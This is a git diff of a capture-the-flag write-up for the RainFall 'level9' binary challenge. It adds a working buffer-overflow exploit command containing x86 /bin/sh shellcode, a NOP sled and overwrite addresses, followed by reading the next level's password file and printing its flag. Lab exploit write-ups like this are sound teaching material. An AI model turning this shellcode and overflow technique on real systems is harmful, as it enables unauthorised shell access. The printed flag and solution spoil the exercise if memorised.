@@ -1,4 +1,4 @@
-# levelx
+# level9
 
 > Some preliminaries: if we need to install something or use something specific.
 
@@ -175,7 +175,8 @@ Here everything concerning the exploit description.
 
 Segault when argument >= 109:
 
-```
-level9@RainFall:~$ ./level9 `python -c 'print "A"*109'`
-Segmentation fault (core dumped)
+```console
+level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x90"*14 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*54 + "\x0c\xa0\x04\x08"'`
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
